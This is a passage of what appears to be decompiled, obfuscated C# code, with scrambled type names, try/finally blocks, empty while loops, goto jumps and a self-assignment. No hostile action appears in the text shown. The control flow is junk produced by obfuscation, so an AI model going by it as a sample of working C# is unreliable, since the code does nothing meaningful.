		}
		try
		{
			_ = (y8R)(object)a7W.Default;
		}
		finally
		{
			while (obj != null)
			{
			}
			goto IL_02f2;
		}
		IL_0347:
		try
		{
			while (obj != null)
			{
				try
				{
					Jy1 obj15 = (Jy1)(object)a7W.Default;
					jy = null;
					jy = obj15;
				}
				finally
				{
					_ = (i0A1)(object)a7W.Default;
					_ = (i0A1)(object)a7W.Default;
					continue;
				}
			}
		}
		finally
		{
			try
			{
				jy = jy;
			}
			catch
			{
				_ = (i0A1)(object)a7W.Default;
			}
			goto IL_039c;
		}
	}
}
